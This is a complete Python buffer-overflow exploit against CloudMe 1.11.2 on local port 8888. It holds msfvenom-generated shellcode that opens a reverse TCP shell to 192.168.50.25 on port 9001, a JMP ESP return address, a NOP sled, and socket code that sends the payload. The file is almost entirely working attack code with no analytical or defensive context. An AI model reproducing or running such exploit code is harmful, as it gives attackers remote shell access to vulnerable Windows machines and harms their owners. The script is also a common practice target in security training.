# Buffer overflow exploit for CloudME 1.11.2 
# Cloudme runs on localhost port 8888

import sys, socket


# msfvenom -p exploit/windows_reverse_tcp LHOST 192.168.50.25 LPORT 9001 -a x86 -f python -b "\x00\x0A\x0D"
buf =  b""
buf += b"\xd9\xec\xba\xd4\x96\xa5\x98\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x53\x17\x83\xc3\x04\x03\x87\x85\x47"
buf += b"\x6d\xdb\x42\x05\x8e\x23\x93\x6a\x06\xc6\xa2\xaa\x7c"
buf += b"\x83\x95\x1a\xf6\xc1\x19\xd0\x5a\xf1\xaa\x94\x72\xf6"
buf += b"\x1b\x12\xa5\x39\x9b\x0f\x95\x58\x1f\x52\xca\xba\x1e"
buf += b"\x9d\x1f\xbb\x67\xc0\xd2\xe9\x30\x8e\x41\x1d\x34\xda"
buf += b"\x59\x96\x06\xca\xd9\x4b\xde\xed\xc8\xda\x54\xb4\xca"
buf += b"\xdd\xb9\xcc\x42\xc5\xde\xe9\x1d\x7e\x14\x85\x9f\x56"
buf += b"\x64\x66\x33\x97\x48\x95\x4d\xd0\x6f\x46\x38\x28\x8c"
buf += b"\xfb\x3b\xef\xee\x27\xc9\xeb\x49\xa3\x69\xd7\x68\x60"
buf += b"\xef\x9c\x67\xcd\x7b\xfa\x6b\xd0\xa8\x71\x97\x59\x4f"
buf += b"\x55\x11\x19\x74\x71\x79\xf9\x15\x20\x27\xac\x2a\x32"
buf += b"\x88\x11\x8f\x39\x25\x45\xa2\x60\x22\xaa\x8f\x9a\xb2"
buf += b"\xa4\x98\xe9\x80\x6b\x33\x65\xa9\xe4\x9d\x72\xce\xde"
buf += b"\x5a\xec\x31\xe1\x9a\x25\xf6\xb5\xca\x5d\xdf\xb5\x80"
buf += b"\x9d\xe0\x63\x06\xcd\x4e\xdc\xe7\xbd\x2e\x8c\x8f\xd7"
buf += b"\xa0\xf3\xb0\xd8\x6a\x9c\x5b\x23\xfd\x63\x33\x19\xe4"
buf += b"\x0b\x46\x5d\x35\xe5\xcf\xbb\x53\xe5\x99\x14\xcc\x9c"
buf += b"\x83\xee\x6d\x60\x1e\x8b\xae\xea\xad\x6c\x60\x1b\xdb"
buf += b"\x7e\x15\xeb\x96\xdc\xb0\xf4\x0c\x48\x5e\x66\xcb\x88"
buf += b"\x29\x9b\x44\xdf\x7e\x6d\x9d\xb5\x92\xd4\x37\xab\x6e"
buf += b"\x80\x70\x6f\xb5\x71\x7e\x6e\x38\xcd\xa4\x60\x84\xce"
buf += b"\xe0\xd4\x58\x99\xbe\x82\x1e\x73\x71\x7c\xc9\x28\xdb"
buf += b"\xe8\x8c\x02\xdc\x6e\x91\x4e\xaa\x8e\x20\x27\xeb\xb1"
buf += b"\x8d\xaf\xfb\xca\xf3\x4f\x03\x01\xb0\x60\x4e\x0b\x91"
buf += b"\xe8\x17\xde\xa3\x74\xa8\x35\xe7\x80\x2b\xbf\x98\x76"
buf += b"\x33\xca\x9d\x33\xf3\x27\xec\x2c\x96\x47\x43\x4c\xb3"

# JMP ESP 68e05735
buffer = b"A" * 1052 + b"\x35\x57\xe0\x68" + b"\x90" * 32 + buf

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1',8888))
    s.send((buffer))
    s.close()
    
except:
    print("Error connecting to server")
    sys.exit
